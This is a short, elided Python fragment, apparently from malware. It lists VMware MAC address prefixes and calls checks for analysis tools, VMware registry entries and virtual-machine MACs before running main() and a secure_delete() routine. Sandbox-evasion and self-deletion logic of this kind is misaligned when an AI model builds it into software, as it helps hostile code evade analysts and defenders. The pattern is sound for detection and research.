...
def vmware_mac():
    ...
    mac_addresses = [('\x00\x05i', '00:05:69'), ('\x00\x0c)', '00:0c:29'),
        ('\x00\x1c\x14', '00:1C:14'), ('\x00PV', '00:50:56')]
...
if __name__ == '__main__':
    call_detect_analysis_tools()
    call_detect_vmtools_reg()
    call_detect_vmware_mac()
    main()
    secure_delete()
